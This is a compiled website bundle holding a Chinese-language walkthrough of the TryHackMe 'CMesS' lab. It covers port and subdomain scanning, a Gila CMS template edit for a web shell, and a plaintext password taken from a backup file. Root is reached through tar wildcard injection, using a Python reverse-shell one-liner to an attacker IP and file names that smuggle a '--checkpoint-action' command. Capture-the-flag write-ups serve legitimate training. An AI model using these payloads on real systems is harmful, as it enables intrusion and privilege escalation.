"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[4315],{68962:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var t=s(74848),r=s(28453);const a={sidebar_position:92,tags:["Easy","Linux","\u901a\u914d\u7b26\u5229\u7528","\u5bc6\u7801\u91cd\u7528"],title:"CMesS",description:"CMesS",sidebar_label:"CMesS",slug:"/tryhackme/92"},o="CMesS",i={id:"box/TryHackMe/92",title:"CMesS",description:"CMesS",source:"@site/docs/box/TryHackMe/92.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/92",permalink:"/docs/tryhackme/92",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u901a\u914d\u7b26\u5229\u7528",permalink:"/docs/tags/\u901a\u914d\u7b26\u5229\u7528"},{label:"\u5bc6\u7801\u91cd\u7528",permalink:"/docs/tags/\u5bc6\u7801\u91cd\u7528"}],version:"current",sidebarPosition:92,frontMatter:{sidebar_position:92,tags:["Easy","Linux","\u901a\u914d\u7b26\u5229\u7528","\u5bc6\u7801\u91cd\u7528"],title:"CMesS",description:"CMesS",sidebar_label:"CMesS",slug:"/tryhackme/92"},sidebar:"boxSidebar",previous:{title:"Watcher",permalink:"/docs/tryhackme/91"},next:{title:"Road",permalink:"/docs/tryhackme/93"}},d={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; andre",id:"www-data--andre",level:3},{value:"andre  \u2014&gt; root",id:"andre---root",level:3}];function l(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"cmess",children:"CMesS"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-248-76:~/cmess# nmap -sTCV -p 22,80 --min-rate 1000 10.10.120.159\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-14 09:00 BST\nNmap scan report for cmess.thm (10.10.120.159)\nHost is up (0.00016s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)\n|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)\n|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (EdDSA)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: Gila CMS\n| http-robots.txt: 3 disallowed entries \n|_/src/ /themes/ /lib/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nMAC Address: 02:A8:F1:2F:5B:99 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636e\u9898\u76ee\u7ed9\u51fa\u6211\u4e00\u4e2a\u5173\u4e8e\u57df\u6211\u5c31\u731c\u5230\u9700\u8981\u8fdb\u884c\u5b50\u57df\u626b\u63cf, \u6240\u4ee5\u6211\u5c31\u5148\u8fdb\u884c\u4e86\u5b50\u57df\u7684\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-248-76:~/cmess# ./gobuster vhost -u http://cmess.thm/  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://cmess.thm/\n[+] Method:          GET\n[+] Threads:         10\n[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:      gobuster/3.6\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\nStarting gobuster in VHOST enumeration mode\n===============================================================\nFound: dev.cmess.thm Status: 200 [Size: 934]\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u626b\u63cf\u51fa\u4e00\u4e2a\u5b50\u57df\u8fdb\u884c\u67e5\u770b\u5728\u5176\u4e2d\u83b7\u53d6\u5230\u4e00\u4e2a\u8d26\u6237:"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703221640.png",alt:"20240703221640"})}),"\n",(0,t.jsx)(n.p,{children:"\u4e4b\u540e\u901a\u8fc7\u7aef\u53e3\u626b\u63cf\u6211\u77e5\u9053 80 \u7684\u662f\u4e00\u4e2a Gila  CMS , \u6240\u4ee5\u76f4\u63a5\u8fdb\u884c\u767b\u9646\u540e\u53f0\u7136\u540e\u627e\u4e0a\u4f20\u70b9,\u7ed3\u679c\u6211\u53d1\u73b0\u4e86\u6a21\u677f\u7f16\u8f91\u5904, \u8fd9\u4e0d\u5c31\u662f\u548c wordpress \u5dee\u4e0d\u591a\u4e86, \u4e8e\u662f\u6211\u4fee\u6539\u4e86 index.php \u6587\u4ef6\u7684\u5185\u5bb9 (\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u5148\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684\u76ee\u5f55\u8fdb\u884c\u4fee\u6539\u800c\u4e0d\u662f\u6240\u8c13\u7684\u6a21\u677f\u76ee\u5f55)"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"http://vpn.cmess.thm/admin/fm?f=./index.php \n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703221658.png",alt:"20240703221658"})}),"\n",(0,t.jsx)(n.h3,{id:"www-data--andre",children:"www-data \u2014> andre"}),"\n",(0,t.jsx)(n.p,{children:"\u6b64\u65f6\u67e5\u770b\u7f51\u7ad9\u7684\u914d\u7f6e\u4fe1\u606f\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a\u7528\u6237\u7684\u5bc6\u7801 , \u4f46\u662f\u65e0\u6cd5\u7834\u89e3\u6210\u529f,"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"mysql> SELECT * FROM user;\n+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+\n| id | username | email           | pass                                                         | active | reset_code | created             | updated             |\n+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+\n|  1 | andre    | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa |      1 |            | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 |\n+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u63a5\u7740\u6211\u5c1d\u8bd5\u4e86\u641c\u5bfb, \u7ed3\u679c\u5728 opt \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\u8fd9\u5c31\u662f\u7528\u6237 andre \u7684\u5bc6\u7801"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@cmess:/opt$ ls -al\ntotal 12\ndrwxr-xr-x  2 root root 4096 Feb  6  2020 .\ndrwxr-xr-x 22 root root 4096 Feb  6  2020 ..\n-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak\n(remote) www-data@cmess:/opt$ cat .password.bak \nandres backup password\nUQfsdCB7aAP6\n(remote) www-data@cmess:/opt$ su andre \nPassword: \nandre@cmess:/opt$ cd ~\n"})}),"\n",(0,t.jsx)(n.h3,{id:"andre---root",children:"andre  \u2014> root"}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u770b\u5b9a\u65f6\u4efb\u52a1\u6211\u53d1\u73b0\u5b58\u5728\u901a\u914d\u7b26\u5229\u7528\u6f0f\u6d1e"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703221723.png",alt:"20240703221723"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'andre@cmess:~/backup$ cat << EOF  > root.sh\n> python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.248.76",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'\n> EOF\nandre@cmess:~/backup$  echo "" > "--checkpoint-action=exec=sh root.sh"\nandre@cmess:~/backup$ echo "" > --checkpoint=1\nandre@cmess:~/backup$ ls -al\ntotal 24\ndrwxr-x--- 2 andre andre 4096 Sep 14 01:46 .\ndrwxr-x--- 4 andre andre 4096 Feb  9  2020 ..\n-rw-rw-r-- 1 andre andre    1 Sep 14 01:46 --checkpoint=1\n-rw-rw-r-- 1 andre andre    1 Sep 14 01:46 --checkpoint-action=exec=sh root.sh\n-rwxr-x--- 1 andre andre   51 Feb  9  2020 note\n-rw-rw-r-- 1 andre andre  227 Sep 14 01:46 root.sh\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u5f00\u542f\u76d1\u542c\u7b49\u5f85\u8fde\u63a5\u5373\u53ef"})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>i});var t=s(96540);const r={},a=t.createContext(r);function o(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);